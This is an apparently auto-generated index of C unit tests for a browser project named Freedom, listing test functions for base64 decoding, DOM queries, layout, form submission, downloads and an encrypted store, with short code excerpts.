- `test_payload_percent_encoded_not_supported` (line 80) `static void test_payload_percent_encoded_not_supported(void **state)`
- `test_payload_no_comma` (line 88) `static void test_payload_no_comma(void **state)`
- `test_payload_base64_flag_case_insensitive` (line 96) `static void test_payload_base64_flag_case_insensitive(void **state)`
- `test_payload_too_large` (line 105) `static void test_payload_too_large(void **state)`
- `test_payload_nulls` (line 121) `static void test_payload_nulls(void **state)`
- `test_decode_one_byte_double_pad` (line 134) `static void test_decode_one_byte_double_pad(void **state)` - *} static void test_payload_nulls(void **state) { (void)state; const char *payload = NULL; size_t plen = 0; assert_int_equal(du_base64_payload(NULL, &payload, &plen), DU_ERR_NULL_ARG); assert_int_equal(du_base64_payload("data:image/png;base64,QQ==", NULL, &plen), DU_ERR_NULL_ARG); assert_int_equal(du_base64_payload("data:image/png;base64,QQ==", &payload, NULL), DU_ERR_NULL_ARG); } /* --- du_base64_decode ---*
- `test_decode_two_bytes_single_pad` (line 145) `static void test_decode_two_bytes_single_pad(void **state)`
- `test_decode_no_padding_needed` (line 158) `static void test_decode_no_padding_needed(void **state)`
- `test_decode_multi_group` (line 170) `static void test_decode_multi_group(void **state)`
- `test_decode_empty` (line 182) `static void test_decode_empty(void **state)`
- `test_decode_bad_length_not_multiple_of_4` (line 192) `static void test_decode_bad_length_not_multiple_of_4(void **state)`
- `test_decode_padding_in_wrong_position` (line 200) `static void test_decode_padding_in_wrong_position(void **state)`
- `test_decode_invalid_character` (line 209) `static void test_decode_invalid_character(void **state)`
- `test_decode_too_large` (line 220) `static void test_decode_too_large(void **state)`
- `test_decode_nulls` (line 235) `static void test_decode_nulls(void **state)`
- `test_end_to_end_png_data_uri` (line 246) `static void test_end_to_end_png_data_uri(void **state)` - *assert_null(out); free(b64); } static void test_decode_nulls(void **state) { (void)state; uint8_t *out = NULL; size_t out_len = 0; assert_int_equal(du_base64_decode(NULL, 4, &out, &out_len), DU_ERR_NULL_ARG); assert_int_equal(du_base64_decode("QQ==", 4, NULL, &out_len), DU_ERR_NULL_ARG); assert_int_equal(du_base64_decode("QQ==", 4, &out, NULL), DU_ERR_NULL_ARG); } /* --- End-to-end: a real 1x1 PNG data URI round-trips to valid PNG bytes ---*
- `main` (line 267) `int main(void)`

#### `test_disk_store.c`
**Path:** `tests/test_disk_store.c`

**Functions:**
- `setup` (line 34) `static int setup(void **state)`
- `teardown` (line 44) `static int teardown(void **state)`
- `count_dir_entries` (line 64) `static size_t count_dir_entries(const char *dir)`
- `test_roundtrip` (line 77) `static void test_roundtrip(void **state)`
- `test_roundtrip_chacha` (line 88) `static void test_roundtrip_chacha(void **state)`
- `test_empty` (line 98) `static void test_empty(void **state)`
- `test_permissions` (line 107) `static void test_permissions(void **state)`
- `test_no_temp_left` (line 116) `static void test_no_temp_left(void **state)`
- `test_overwrite` (line 123) `static void test_overwrite(void **state)`
- `test_wrong_key` (line 137) `static void test_wrong_key(void **state)`
- `test_tamper_on_disk` (line 149) `static void test_tamper_on_disk(void **state)`
- `test_missing_and_null` (line 167) `static void test_missing_and_null(void **state)`
- `main` (line 180) `int main(void)`

**Macros:**
- `_POSIX_C_SOURCE` (line 7)

**Structs:**
- `fixture` (line 33)

#### `test_dom.c`
**Path:** `tests/test_dom.c`

**Functions:**
- `setup_doc` (line 32) `static int setup_doc(void **state)` - *#include "dom.h" #include "html_parse.h" static const char HTML[] = "<!DOCTYPE html><html><head><title>T</title></head>" "<body>" "<div id=\"main\" class=\"container box\">" "<p class=\"text\">Hello</p>" "<p class=\"text muted\">World</p>" "<button id=\"go\" class=\"btn\">Go</button>" "</div>" "</body></html>"; /* Parses HTML and builds the index. Caller frees with teardown_doc.*
- `teardown_doc` (line 44) `static int teardown_doc(void **state)`
- `test_build_null_args` (line 59) `static void test_build_null_args(void **state)` - *static int teardown_doc(void **state) { void **pair = (void **)*state; if (pair != NULL) { dom_free((dom_index *)pair[1]); hp_document_free((hp_document *)pair[0]); free(pair); } return 0; } #define DOC(state)  ((hp_document *)(((void **)*(state))[0])) #define IDX(state)  ((dom_index *)(((void **)*(state))[1])) /* --- lifecycle ---*
- `test_free_null_and_double` (line 69) `static void test_free_null_and_double(void **state)`
- `test_node_count` (line 80) `static void test_node_count(void **state)`
- `test_get_by_id` (line 87) `static void test_get_by_id(void **state)` - *hp_document *doc = NULL; assert_int_equal(hp_parse(HTML, sizeof HTML - 1, NULL, &doc), HP_OK); dom_index *idx = NULL; assert_int_equal(dom_build(doc, &idx), DOM_OK); dom_free(idx); hp_document_free(doc); } static void test_node_count(void **state) { assert_true(dom_node_count(IDX(state)) > 0); assert_int_equal(dom_node_count(NULL), 0); } /* --- by id ---*
- `test_get_by_id_absent` (line 101) `static void test_get_by_id_absent(void **state)`
- `test_by_class` (line 108) `static void test_by_class(void **state)` - *assert_non_null(tag); assert_string_equal(tag, "div"); dom_node_id go = dom_get_element_by_id(idx, "go"); assert_int_not_equal(go, DOM_NODE_NONE); assert_string_equal(dom_tag_name(idx, go, NULL), "button"); } static void test_get_by_id_absent(void **state) { assert_int_equal(dom_get_element_by_id(IDX(state), "nope"), DOM_NODE_NONE); assert_int_equal(dom_get_element_by_id(NULL, "main"), DOM_NODE_NONE); } /* --- by class / tag ---*
- `test_by_tag` (line 117) `static void test_by_tag(void **state)`
- `test_by_tag_results_in_document_order` (line 126) `static void test_by_tag_results_in_document_order(void **state)`
- `test_document_order` (line 136) `static void test_document_order(void **state)` - *assert_int_equal(dom_get_by_tag(idx, "P", buf, 8), 2); /* case-insensitive assert_int_equal(dom_get_by_tag(idx, "button", buf, 8), 1); assert_int_equal(dom_get_by_tag(idx, "marquee", buf, 8), 0); } static void test_by_tag_results_in_document_order(void **state) { dom_index *idx = IDX(state); dom_node_id buf[8]; size_t n = dom_get_by_tag(idx, "p", buf, 8); assert_int_equal(n, 2); assert_true(dom_precedes(idx, buf[0], buf[1])); } /* --- document order ---*
- `test_navigation` (line 150) `static void test_navigation(void **state)` - *static void test_document_order(void **state) { dom_index *idx = IDX(state); dom_node_id main_id = dom_get_element_by_id(idx, "main"); dom_node_id go = dom_get_element_by_id(idx, "go"); assert_true(dom_precedes(idx, main_id, go)); assert_false(dom_precedes(idx, go, main_id)); size_t pos = dom_document_position(idx, go); assert_int_equal(dom_node_at(idx, pos), go); assert_int_equal(dom_node_at(idx, dom_node_count(idx)), DOM_NODE_NONE); } /* --- navigation ---*
- `test_attributes` (line 170) `static void test_attributes(void **state)` - *assert_int_not_equal(p1, DOM_NODE_NONE); assert_string_equal(dom_tag_name(idx, p1, NULL), "p"); dom_node_id p2 = dom_next_sibling(idx, p1); assert_string_equal(dom_tag_name(idx, p2, NULL), "p"); dom_node_id btn = dom_next_sibling(idx, p2); assert_string_equal(dom_tag_name(idx, btn, NULL), "button"); assert_int_equal(dom_next_sibling(idx, btn), DOM_NODE_NONE); assert_int_equal(dom_parent(idx, btn), main_id); } /* --- attributes ---*
- `test_text_content_read` (line 184) `static void test_text_content_read(void **state)` - *static void test_attributes(void **state) { dom_index *idx = IDX(state); dom_node_id main_id = dom_get_element_by_id(idx, "main"); size_t len = 0; const char *cls = dom_get_attribute(idx, main_id, "class", &len); assert_non_null(cls); assert_string_equal(cls, "container box"); assert_int_equal((int)len, (int)strlen("container box")); assert_null(dom_get_attribute(idx, main_id, "data-missing", NULL)); } /* --- mutation (live JS) ---*
- `test_set_text_content_changes_tree` (line 195) `static void test_set_text_content_changes_tree(void **state)`
- `test_set_text_content_empty_clears` (line 213) `static void test_set_text_content_empty_clears(void **state)`
- `test_set_text_content_invalid_node` (line 223) `static void test_set_text_content_invalid_node(void **state)`
- `test_set_and_get_document_title` (line 228) `static void test_set_and_get_document_title(void **state)`
- `test_create_and_append` (line 240) `static void test_create_and_append(void **state)`
- `test_append_rejects_cycle` (line 258) `static void test_append_rejects_cycle(void **state)`
- `test_remove_child` (line 268) `static void test_remove_child(void **state)`
- `test_set_attribute_reindexes_id` (line 280) `static void test_set_attribute_reindexes_id(void **state)`
- `test_remove_attribute` (line 293) `static void test_remove_attribute(void **state)`
- `test_set_inner_html` (line 310) `static void test_set_inner_html(void **state)`
- `test_construction_invalid_args` (line 326) `static void test_construction_invalid_args(void **state)`
- `test_get_inner_html` (line 334) `static void test_get_inner_html(void **state)`
- `test_query_selector_type_class_id` (line 362) `static void test_query_selector_type_class_id(void **state)` - *Fixture tree (inside body): div#main.container.box > [ p.text "Hello", * p.text.muted "World", button#go.btn "Go" ].*
- `test_query_selector_all_counts` (line 376) `static void test_query_selector_all_counts(void **state)`
- `test_query_selector_combinators` (line 387) `static void test_query_selector_combinators(void **state)`
- `test_query_selector_nth_and_structural` (line 400) `static void test_query_selector_nth_and_structural(void **state)`
- `test_query_selector_scope_is_descendants_only` (line 413) `static void test_query_selector_scope_is_descendants_only(void **state)`
- `test_matches_and_closest` (line 425) `static void test_matches_and_closest(void **state)`
- `test_query_selector_fail_closed` (line 438) `static void test_query_selector_fail_closed(void **state)`
- `main` (line 454) `int main(void)`

**Macros:**
- `DOC` (line 54)
- `IDX` (line 56)

#### `test_dom_debug.c`
**Path:** `tests/test_dom_debug.c`

**Functions:**
- `caps_css_on` (line 28) `static rdp_caps caps_css_on(void)`
- `build` (line 36) `static rd_doc *build(pv_view *v, rdp_caps caps)` - *#include "dom_debug.h" #include "page_view.h" #include "render_doc.h" #include "render_policy.h" static const char TOP[] = "https://example.com/"; static rdp_caps caps_css_on(void) { rdp_caps c = rdp_caps_safe(); c.css = true;          /* box tree + author box/style fields only with caps.css return c; } /* Builds an rd_doc from v (taking ownership of neither; caller frees v).*
- `test_null_doc_is_empty_header` (line 44) `static void test_null_doc_is_empty_header(void **state)` - *rdp_caps c = rdp_caps_safe(); c.css = true;          /* box tree + author box/style fields only with caps.css return c; } /* Builds an rd_doc from v (taking ownership of neither; caller frees v). static rd_doc *build(pv_view *v, rdp_caps caps) { rd_doc *d = NULL; assert_int_equal(rd_build(v, caps, TOP, &d), RD_OK); assert_non_null(d); return d; } /* --- empty / null ---*
- `test_heading_paragraph_link` (line 58) `static void test_heading_paragraph_link(void **state)` - *static void test_null_doc_is_empty_header(void **state) { (void)state; char buf[256]; size_t n = dd_format(NULL, buf, sizeof buf); assert_true(n > 0); assert_true(n < sizeof buf);              /* not truncated assert_non_null(strstr(buf, "=== Freedom render tree ===")); assert_non_null(strstr(buf, "blocks: 0")); assert_non_null(strstr(buf, "boxes: 0")); assert_non_null(strstr(buf, "containers: 0")); } /* --- structural mapping: kind + tag + href in document order ---*
- `test_grid_container_annotation` (line 91) `static void test_grid_container_annotation(void **state)` - *-- a grid container (a table) annotates its cells: the field that reveals a *     collapsed table column ---*
- `test_box_tree_width_cap` (line 115) `static void test_box_tree_width_cap(void **state)` - *char buf[1024]; size_t n = dd_format(d, buf, sizeof buf); assert_true(n < sizeof buf); assert_non_null(strstr(buf, "containers: 1")); /* one distinct cont_id assert_non_null(strstr(buf, "cont=#7")); assert_non_null(strstr(buf, "grid")); assert_non_null(strstr(buf, "cols=3")); rd_free(d); pv_free(v); } /* --- a box def with a width cap appears in [boxes]; its block carries box=#id ---*
- `test_visibility_overflow_cursor_and_text_wrap` (line 153) `static void test_visibility_overflow_cursor_and_text_wrap(void **state)` - *size_t n = dd_format(d, buf, sizeof buf); assert_true(n < sizeof buf); assert_non_null(strstr(buf, "boxes: 1")); assert_non_null(strstr(buf, "[boxes]")); assert_non_null(strstr(buf, "w=300")); assert_non_null(strstr(buf, "#ff6600")); assert_non_null(strstr(buf, "box=#0"));        /* the block joined box 0 rd_free(d); pv_free(v); } /* --- visibility/overflow/cursor on a box, and text-overflow/word-break on a run ---*
- `test_no_box_tree_without_css` (line 196) `static void test_no_box_tree_without_css(void **state)` - *size_t n = dd_format(d, buf, sizeof buf); assert_true(n < sizeof buf); assert_non_null(strstr(buf, "visibility=hidden")); assert_non_null(strstr(buf, "overflow=hidden/scroll")); assert_non_null(strstr(buf, "cursor=pointer")); assert_non_null(strstr(buf, "text-overflow=ellipsis")); assert_non_null(strstr(buf, "word-break=break")); rd_free(d); pv_free(v); } /* --- with caps.css off there is no box tree (byte-identical render principle) ---*
- `test_truncation_no_overflow` (line 216) `static void test_truncation_no_overflow(void **state)` - *pv_box_def b; memset(&b, 0, sizeof b); b.parent_id = -1; b.bsh_color = -1; assert_int_equal(pv_add_box_def(v, &b), PV_OK); rd_doc *d = build(v, rdp_caps_safe());         /* css OFF char buf[512]; dd_format(d, buf, sizeof buf); assert_non_null(strstr(buf, "boxes: 0")); assert_null(strstr(buf, "[boxes]")); rd_free(d); pv_free(v); } /* --- bounded: tiny cap never overflows, returns full length, NUL-terminates ---*
- `test_control_bytes_kept_on_one_line` (line 244) `static void test_control_bytes_kept_on_one_line(void **state)` - *size_t n = dd_format(d, (char *)guard, cap); assert_int_equal((int)n, (int)full);          /* reports the untruncated length /* NUL within the cap int found_nul = 0; for (size_t i = 0; i < cap; ++i) if (guard[i] == '\0') { found_nul = 1; break; } assert_true(found_nul); /* nothing written past cap-1 for (size_t i = cap; i < sizeof guard; ++i) assert_int_equal(guard[i], 0xAA); rd_free(d); pv_free(v); } /* --- a control byte in hostile text never breaks the one-line-per-block layout ---*
- `main` (line 268) `int main(void)`

#### `test_download.c`
**Path:** `tests/test_download.c`

**Functions:**
- `builder` (line 8) `* builder (join, separator rejection, overflow, NULL), and the size cap.
 */

#include <setjmp.h>...`
- `test_should_renderable_types` (line 29) `static void test_should_renderable_types(void **state)`
- `test_should_binary_types` (line 40) `static void test_should_binary_types(void **state)`
- `test_ext_known_types` (line 51) `static void test_ext_known_types(void **state)` - *assert_int_equal(dl_should_download(NULL, NULL), 0);          /* missing type renders assert_int_equal(dl_should_download("", NULL), 0); } static void test_should_binary_types(void **state) { (void)state; assert_int_equal(dl_should_download("application/pdf", NULL), 1); assert_int_equal(dl_should_download("application/zip", NULL), 1); assert_int_equal(dl_should_download("application/octet-stream", NULL), 1); assert_int_equal(dl_should_download("image/png", NULL), 1); assert_int_equal(dl_should_download("APPLICATION/PDF ; q=1", NULL), 1); /* ci + params } /* --- dl_ext_for_type ---*
- `test_ext_unknown_type` (line 62) `static void test_ext_unknown_type(void **state)`
- `test_pick_from_disposition_quoted` (line 71) `static void test_pick_from_disposition_quoted(void **state)` - *assert_string_equal(dl_ext_for_type("text/plain; charset=utf-8"), ".txt"); assert_string_equal(dl_ext_for_type("IMAGE/JPEG"), ".jpg"); assert_string_equal(dl_ext_for_type("image/svg+xml"), ".svg"); assert_string_equal(dl_ext_for_type("text/html; charset=utf-8"), ".html"); } static void test_ext_unknown_type(void **state) { (void)state; assert_string_equal(dl_ext_for_type("application/octet-stream"), ""); assert_string_equal(dl_ext_for_type(NULL), ""); assert_string_equal(dl_ext_for_type("weird/thing"), ""); } /* --- dl_pick_name ---*
- `test_pick_from_disposition_ext_form` (line 80) `static void test_pick_from_disposition_ext_form(void **state)`
- `test_pick_from_url_segment` (line 90) `static void test_pick_from_url_segment(void **state)`
- `test_pick_appends_extension_when_missing` (line 98) `static void test_pick_appends_extension_when_missing(void **state)`
- `test_pick_keeps_existing_extension` (line 107) `static void test_pick_keeps_existing_extension(void **state)`
- `test_pick_traversal_contained` (line 116) `static void test_pick_traversal_contained(void **state)`
- `test_pick_fallback_when_empty` (line 128) `static void test_pick_fallback_when_empty(void **state)`
- `test_pick_null_out` (line 140) `static void test_pick_null_out(void **state)`
- `test_pick_overflow_fails_closed` (line 147) `static void test_pick_overflow_fails_closed(void **state)`
- `test_build_path_basic` (line 157) `static void test_build_path_basic(void **state)` - *char out[8]; assert_int_equal(dl_pick_name("https://x/y.pdf", NULL, NULL, NULL, sizeof out), DL_ERR_NULL_ARG); assert_int_equal(dl_pick_name("https://x/y.pdf", NULL, NULL, out, 0), DL_ERR_NULL_ARG); } static void test_pick_overflow_fails_closed(void **state) { (void)state; char out[4]; assert_int_equal(dl_pick_name("https://x/averylongfilename.pdf", NULL, NULL, out, sizeof out), DL_ERR_OVERFLOW); assert_string_equal(out, ""); } /* --- dl_build_path ---*
- `test_build_path_trailing_slash` (line 164) `static void test_build_path_trailing_slash(void **state)`
- `test_build_path_rejects_separator_in_name` (line 171) `static void test_build_path_rejects_separator_in_name(void **state)`
- `test_build_path_overflow` (line 178) `static void test_build_path_overflow(void **state)`
- `test_build_path_null_args` (line 185) `static void test_build_path_null_args(void **state)`
- `test_check_size` (line 196) `static void test_check_size(void **state)` - *assert_int_equal(dl_build_path("/a/very/long/dir", "name.pdf", out, sizeof out), DL_ERR_OVERFLOW); assert_string_equal(out, ""); } static void test_build_path_null_args(void **state) { (void)state; char out[64]; assert_int_equal(dl_build_path(NULL, "x", out, sizeof out), DL_ERR_NULL_ARG); assert_int_equal(dl_build_path("/d", NULL, out, sizeof out), DL_ERR_NULL_ARG); assert_int_equal(dl_build_path("/d", "x", NULL, sizeof out), DL_ERR_NULL_ARG); assert_int_equal(dl_build_path("/d", "x", out, 0), DL_ERR_NULL_ARG); } /* --- dl_check_size ---*
- `main` (line 203) `int main(void)`

#### `test_flex_layout.c`
**Path:** `tests/test_flex_layout.c`

**Functions:**
- `assert_item` (line 24) `static void assert_item(fx_result r, double pos, double size)`
- `test_grow_equal` (line 29) `static void test_grow_equal(void **state)`
- `test_grow_weighted` (line 38) `static void test_grow_weighted(void **state)`
- `test_shrink_equal` (line 47) `static void test_shrink_equal(void **state)`
- `test_shrink_with_min_clamp` (line 56) `static void test_shrink_with_min_clamp(void **state)`
- `test_gap_start` (line 66) `static void test_gap_start(void **state)`
- `test_justify_center` (line 75) `static void test_justify_center(void **state)`
- `test_justify_end` (line 84) `static void test_justify_end(void **state)`
- `test_justify_space_between` (line 93) `static void test_justify_space_between(void **state)`
- `test_justify_space_around` (line 102) `static void test_justify_space_around(void **state)`
- `test_justify_space_evenly` (line 111) `static void test_justify_space_evenly(void **state)`
- `test_space_between_single_item_is_start` (line 121) `static void test_space_between_single_item_is_start(void **state)`
- `test_negative_fields_clamped` (line 129) `static void test_negative_fields_clamped(void **state)`
- `test_flex_zero_items_is_noop` (line 139) `static void test_flex_zero_items_is_noop(void **state)`
- `test_flex_errors` (line 144) `static void test_flex_errors(void **state)`
- `test_grid_columns` (line 156) `static void test_grid_columns(void **state)`
- `test_grid_columns_too_narrow_clamps_to_zero` (line 168) `static void test_grid_columns_too_narrow_clamps_to_zero(void **state)`
- `test_grid_columns_edges` (line 175) `static void test_grid_columns_edges(void **state)`
- `test_grid_cell` (line 185) `static void test_grid_cell(void **state)`
- `test_grid_weighted_fr` (line 196) `static void test_grid_weighted_fr(void **state)` - *assert_int_equal(fx_grid_columns(320, (size_t)FX_MAX_ITEMS + 1, 10, x, w), FX_ERR_RANGE); assert_int_equal(fx_grid_columns(320, 2, 10, NULL, w), FX_ERR_NULL_ARG); } static void test_grid_cell(void **state) { (void)state; size_t r, c; fx_grid_cell(0, 3, &r, &c); assert_int_equal(r, 0); assert_int_equal(c, 0); fx_grid_cell(7, 3, &r, &c); assert_int_equal(r, 2); assert_int_equal(c, 1); fx_grid_cell(5, 5, &r, &c); assert_int_equal(r, 1); assert_int_equal(c, 0); fx_grid_cell(3, 0, &r, &c); assert_int_equal(r, 0); assert_int_equal(c, 0); /* no div by zero } /* --- weighted tracks + column spans (2026-07-11) ---*
- `test_grid_weighted_fixed_px_reserved_first` (line 208) `static void test_grid_weighted_fixed_px_reserved_first(void **state)`
- `test_grid_weighted_all_auto_matches_equal` (line 220) `static void test_grid_weighted_all_auto_matches_equal(void **state)`
- `test_grid_weighted_fixed_overflow_zeroes_fr` (line 233) `static void test_grid_weighted_fixed_overflow_zeroes_fr(void **state)`
- `test_grid_weighted_errors` (line 243) `static void test_grid_weighted_errors(void **state)`
- `test_grid_place_span_basic` (line 253) `static void test_grid_place_span_basic(void **state)`
- `test_grid_place_span_wraps_when_it_does_not_fit` (line 264) `static void test_grid_place_span_wraps_when_it_does_not_fit(void **state)`
- `test_grid_place_span_clamps_and_defaults` (line 276) `static void test_grid_place_span_clamps_and_defaults(void **state)`
- `test_float_pack_left` (line 292) `static void test_float_pack_left(void **state)`
- `test_float_pack_left_and_right` (line 303) `static void test_float_pack_left_and_right(void **state)`
- `test_float_pack_two_right` (line 315) `static void test_float_pack_two_right(void **state)`
- `test_float_pack_edges` (line 326) `static void test_float_pack_edges(void **state)`
- `test_float_pack_wrap_full_width_stack` (line 343) `static void test_float_pack_wrap_full_width_stack(void **state)` - *Hito 32 (band wrap): two consecutive full-width floats (Slashdot's .grid_24 { width:99.8% }) must STACK -- one per row at x = 0 -- instead of * being crammed side by side into one row.*
- `test_float_pack_wrap_fits_matches_v1` (line 357) `static void test_float_pack_wrap_fits_matches_v1(void **state)` - *static void test_float_pack_wrap_full_width_stack(void **state) { (void)state; double w[3] = { 998.0, 998.0, 998.0 }; int side[3] = { 0, 0, 0 }; double x[3]; size_t row[3]; assert_int_equal(fx_float_pack_wrap(w, side, 3, 1000.0, 0, x, row), FX_OK); for (size_t i = 0; i < 3; ++i) { assert_int_equal((int)row[i], (int)i); assert_true(dbl_eq(x[i], 0.0)); } } /* When everything fits in one row the wrap variant must agree with v1.*
- `test_float_pack_wrap_partial` (line 380) `static void test_float_pack_wrap_partial(void **state)` - *assert_int_equal((int)row[i], 0); assert_true(dbl_eq(x[i], xv1[i])); } /* Left main + right sidebar share row 0 exactly like v1. double w2[2] = { 300.0, 300.0 }; int side2[2] = { 0, 1 }; assert_int_equal(fx_float_pack_wrap(w2, side2, 2, 1000.0, 0, x, row), FX_OK); assert_int_equal((int)row[0], 0); assert_int_equal((int)row[1], 0); assert_true(dbl_eq(x[0], 0.0)); assert_true(dbl_eq(x[1], 700.0)); } /* Partial fit: the overflowing item opens the next row and packing resumes there.*
- `test_float_pack_wrap_errors` (line 402) `static void test_float_pack_wrap_errors(void **state)`
- `test_justify_name` (line 411) `static void test_justify_name(void **state)`
- `main` (line 422) `int main(void)`

#### `test_form.c`
**Path:** `tests/test_form.c`

**Functions:**
- `test_encode_basic` (line 23) `static void test_encode_basic(void **state)` - *NULL name, NULL args).  #include <setjmp.h> #include <stdarg.h> #include <stddef.h> #include <stdint.h> #include <string.h> #include <cmocka.h> #include "form.h" /* --- fm_encode ---*
- `test_encode_space_and_reserved` (line 33) `static void test_encode_space_and_reserved(void **state)`
- `test_encode_unreserved_kept` (line 42) `static void test_encode_unreserved_kept(void **state)`
- `test_encode_empty_and_nameless` (line 50) `static void test_encode_empty_and_nameless(void **state)`
- `test_encode_overflow_fails_closed` (line 58) `static void test_encode_overflow_fails_closed(void **state)`
- `test_encode_null_args` (line 66) `static void test_encode_null_args(void **state)`
- `test_get_relative_action_on_https_base` (line 77) `static void test_get_relative_action_on_https_base(void **state)` - *assert_int_equal(fm_encode(f, 1, out, sizeof out, NULL), FM_ERR_OVERFLOW); assert_string_equal(out, ""); /* no partial encoding } static void test_encode_null_args(void **state) { (void)state; char out[8]; assert_int_equal(fm_encode(NULL, 1, out, sizeof out, NULL), FM_ERR_NULL_ARG); fm_field f[] = { { "a", "b" } }; assert_int_equal(fm_encode(f, 1, NULL, 8, NULL), FM_ERR_NULL_ARG); assert_int_equal(fm_encode(f, 1, out, 0, NULL), FM_ERR_NULL_ARG); } /* --- fm_build GET ---*
- `test_get_absolute_https_action_ignores_base` (line 88) `static void test_get_absolute_https_action_ignores_base(void **state)`
- `test_get_empty_action_submits_to_base` (line 99) `static void test_get_empty_action_submits_to_base(void **state)`
- `test_get_replaces_existing_query` (line 108) `static void test_get_replaces_existing_query(void **state)`
- `test_get_action_cleaned_of_whitespace` (line 118) `static void test_get_action_cleaned_of_whitespace(void **state)`
- `test_post_builds_body` (line 129) `static void test_post_builds_body(void **state)` - *assert_int_equal(p.kind, FM_NAVIGATE); assert_string_equal(p.url, "https://example.com/s?q=new"); } static void test_get_action_cleaned_of_whitespace(void **state) { (void)state; fm_field f[] = { { "q", "z" } }; fm_plan p; assert_int_equal(fm_build("https://example.com/", "  /se\tar\nch  ", FM_GET, f, 1, &p), FM_OK); assert_int_equal(p.kind, FM_NAVIGATE); assert_string_equal(p.url, "https://example.com/search?q=z"); } /* --- fm_build POST ---*
- `test_block_http_downgrade` (line 144) `static void test_block_http_downgrade(void **state)` - *static void test_post_builds_body(void **state) { (void)state; fm_field f[] = { { "user", "a b" }, { "pass", "p&q" } }; fm_plan p; assert_int_equal(fm_build("https://example.com/", "https://example.com/login?ref=1", FM_POST, f, 2, &p), FM_OK); assert_int_equal(p.kind, FM_POST_REQUEST); assert_string_equal(p.url, "https://example.com/login?ref=1"); /* query kept for POST assert_string_equal(p.body, "user=a+b&pass=p%26q"); assert_int_equal((int)p.body_len, (int)strlen("user=a+b&pass=p%26q")); assert_string_equal(p.content_type, FM_CONTENT_TYPE_URLENCODED); } /* --- fail-closed blocks ---*
- `test_block_foreign_scheme` (line 154) `static void test_block_foreign_scheme(void **state)`
- `test_block_relative_action_on_local_base` (line 163) `static void test_block_relative_action_on_local_base(void **state)`
- `test_block_too_many_fields` (line 172) `static void test_block_too_many_fields(void **state)`
- `test_block_null_field_name` (line 182) `static void test_block_null_field_name(void **state)`
- `test_build_null_args` (line 191) `static void test_build_null_args(void **state)`
- `test_get_no_fields_still_navigates` (line 198) `static void test_get_no_fields_still_navigates(void **state)`
- `main` (line 206) `int main(void)`

#### `test_freebug.c`
**Path:** `tests/test_freebug.c`

**Functions:**
- `test_push_and_read` (line 20) `static void test_push_and_read(void **state)` - *include "freebug.h"*
- `test_empty_and_null_text` (line 45) `static void test_empty_and_null_text(void **state)`
- `test_count_cap_fails_closed` (line 58) `static void test_count_cap_fails_closed(void **state)`
- `test_entry_truncated_not_dropped` (line 74) `static void test_entry_truncated_not_dropped(void **state)`
- `test_total_bytes_cap_fails_closed` (line 92) `static void test_total_bytes_cap_fails_closed(void **state)`
- `test_level_clamped` (line 117) `static void test_level_clamped(void **state)`
- `test_level_name` (line 128) `static void test_level_name(void **state)`
- `test_reset_reuses_and_no_leak` (line 139) `static void test_reset_reuses_and_no_leak(void **state)`
- `test_free_idempotent` (line 160) `static void test_free_idempotent(void **state)`
- `test_push_loc_records_location` (line 174) `static void test_push_loc_records_location(void **state)`
- `test_push_loc_null_file_and_negative_nums` (line 196) `static void test_push_loc_null_file_and_negative_nums(void **state)`
- `test_push_loc_file_truncated` (line 213) `static void test_push_loc_file_truncated(void **state)`
- `main` (line 227) `int main(void)`

#### `test_freedom.c`
**Path:** `tests/test_freedom.c`

**Functions:**
- `run_freedom` (line 29) `static int run_freedom(const char *arg, char *out, size_t out_size, int *exit_status)` - *define FREEDOM_BIN "./build/freedom" define OUT_FILE    "__freedom_test_out.txt" define ERR_FILE    "__freedom_test_err.txt"*
- `run_freedom_raw` (line 52) `static int run_freedom_raw(const char *args, int *exit_status)` - *Runs the binary with a raw argument string (no implicit --headless), capturing * stdout into OUT_FILE. Used by the --download-pdf tests, which set their own mode.*
- `is_pdf_file` (line 64) `static int is_pdf_file(const char *path)` - *Runs the binary with a raw argument string (no implicit --headless), capturing * stdout into OUT_FILE. Used by the --download-pdf tests, which set their own mode. static int run_freedom_raw(const char *args, int *exit_status) { char cmd[2048]; int n = snprintf(cmd, sizeof cmd, "%s %s >" OUT_FILE " 2>" ERR_FILE, FREEDOM_BIN, (args != NULL) ? args : ""); if (n < 0 || (size_t)n >= sizeof cmd) return -1; int rc = system(cmd); if (rc == -1) return -1; exit_status = WEXITSTATUS(rc); return 0; } /* True if path exists and its first bytes are the PDF magic "%PDF".*
- `is_png_file` (line 74) `static int is_png_file(const char *path)` - *return 0; } /* True if path exists and its first bytes are the PDF magic "%PDF". static int is_pdf_file(const char *path) { FILE *f = fopen(path, "rb"); if (f == NULL) return 0; char magic[5] = {0}; size_t got = fread(magic, 1, 4, f); fclose(f); return got == 4 && memcmp(magic, "%PDF", 4) == 0; } /* True if path exists and its first bytes are the 8-byte PNG signature.*
- `cleanup_files` (line 83) `static void cleanup_files(void)`
- `read_file_all` (line 90) `static uint8_t *read_file_all(const char *path, size_t *out_len)` - *if (f == NULL) return 0; unsigned char magic[8] = {0}; size_t got = fread(magic, 1, 8, f); fclose(f); static const unsigned char png_sig[8] = {0x89,'P','N','G',0x0D,0x0A,0x1A,0x0A}; return got == 8 && memcmp(magic, png_sig, 8) == 0; } static void cleanup_files(void) { (void)unlink(OUT_FILE); (void)unlink(ERR_FILE); } /* Reads a whole file into a malloc'd buffer (caller frees). NULL on any failure.*
- `test_help` (line 106) `static void test_help(void **state)` - *if (f == NULL) return NULL; if (fseek(f, 0, SEEK_END) != 0) { fclose(f); return NULL; } long sz = ftell(f); if (sz < 0 || fseek(f, 0, SEEK_SET) != 0) { fclose(f); return NULL; } uint8_t *buf = (uint8_t *)malloc((size_t)sz); if (buf == NULL) { fclose(f); return NULL; } size_t got = fread(buf, 1, (size_t)sz, f); fclose(f); if (got != (size_t)sz) { free(buf); return NULL; } out_len = (size_t)sz; return buf; } /* --- argument handling ---*
- `test_version` (line 115) `static void test_version(void **state)`
- `test_no_args` (line 124) `static void test_no_args(void **state)`
- `test_local_html` (line 134) `static void test_local_html(void **state)` - *assert_int_equal(run_freedom("--version", out, sizeof out, &rc), 0); assert_int_equal(rc, 0); assert_non_null(strstr(out, "Freedom")); } static void test_no_args(void **state) { (void)state; char out[512]; int rc; assert_int_equal(run_freedom(NULL, out, sizeof out, &rc), 0); assert_int_equal(rc, 2); } /* --- local file rendering ---*
- `test_local_form_renders_inputs` (line 157) `static void test_local_form_renders_inputs(void **state)`
- `test_missing_file` (line 183) `static void test_missing_file(void **state)`
